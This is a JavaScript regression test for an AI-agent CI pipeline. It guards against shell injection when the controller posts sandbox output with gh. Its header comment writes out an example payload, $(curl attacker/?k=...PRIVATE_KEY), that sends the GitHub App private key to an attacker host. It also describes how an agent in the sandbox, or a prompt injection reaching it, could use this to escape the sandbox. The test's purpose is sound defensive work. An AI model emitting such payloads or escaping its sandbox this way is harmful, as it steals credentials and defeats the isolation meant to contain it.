// Guards the sandbox → controller trust boundary.
//
// The controller runs on the Actions runner and holds DAYTONA_API_KEY and the GitHub App
// PRIVATE KEY. The sandbox holds neither, by design — that separation is the entire security
// story of the per-run credential model. Anything the controller does with sandbox output
// therefore has to treat it as attacker-controlled.
//
// THE BUG THIS EXISTS FOR: the controller posted the sandbox's build tail with
//   sh(`gh issue comment N --repo O/R --body ${JSON.stringify(tail)}`)
// JSON.stringify emits DOUBLE quotes, and a POSIX shell expands `backticks` and $( ) inside
// double quotes. So an agent inside the sandbox — or a prompt injection reaching it — could
// emit $(curl attacker/?k=$NANOBOTS_GITHUB_APP_PRIVATE_KEY) in its output and have the
// CONTROLLER execute it, escaping the sandbox and reaching exactly the credentials the
// sandbox was never supposed to see.
//
// Fix: untrusted content goes over stdin (--body-file -), never into a command string.

import { execSync } from 'node:child_process';
import { readFileSync, readdirSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const T = join(dirname(fileURLToPath(import.meta.url)), '..', 'templates', 'nanobots');
let passed = 0;
const fails = [];
const ok = (c, l) => { if (c) passed++; else fails.push(l); };

// ── the shell really does expand inside JSON.stringify's quotes ───────────────
{
  const evil = 'tail with $(echo PWNED) and `echo ALSO_PWNED`';
  const interpolated = execSync(`echo ${JSON.stringify(evil)}`, { encoding: 'utf8' }).trim();
  ok(interpolated.includes('PWNED') && !interpolated.includes('$('),
    'demonstrates the vulnerability: interpolating through JSON.stringify EXECUTES $( ) and backticks');

  const viaStdin = execSync('cat', { encoding: 'utf8', input: evil });
  ok(viaStdin === evil, 'stdin passes the same content through verbatim, unexecuted');
}

// ── no engine script may interpolate a body into a gh command ────────────────
for (const file of readdirSync(T).filter((f) => f.endsWith('.mjs'))) {
  const src = readFileSync(join(T, file), 'utf8');

  // `--body ${...}` in a template literal is the exact shape that shipped.
  const interpolatedBody = /--body \$\{/.test(src);
  ok(!interpolatedBody, `${file} never interpolates a --body into a shell command (use --body-file - and stdin)`);

  // Any gh comment/review call that carries content must use --body-file.
  const commentCalls = src.match(/gh (issue|pr) comment[^`\n]*/g) ?? [];
  for (const call of commentCalls) {
    ok(call.includes('--body-file'), `${file}: "${call.trim().slice(0, 60)}" must use --body-file -`);
  }
}

// ── the helpers exist where untrusted content is handled ─────────────────────
{
  const worker = readFileSync(join(T, 'daytona-worker.mjs'), 'utf8');
  ok(/function shStdin\(/.test(worker), 'daytona-worker.mjs defines a stdin helper');
  ok(/shStdin\(/.test(worker), 'daytona-worker.mjs actually uses it');
  // redact() strips known secrets, but redaction is not a substitute for not executing.
  ok(/redact\(/.test(worker), 'daytona-worker.mjs still redacts sandbox output before publishing it');
}

if (fails.length) {
  console.error(`FAILED ${fails.length}:`);
  for (const f of fails) console.error(`  ✗ ${f}`);
  process.exit(1);
}
console.log(`ok — ${passed} shell-injection guard tests passed`);
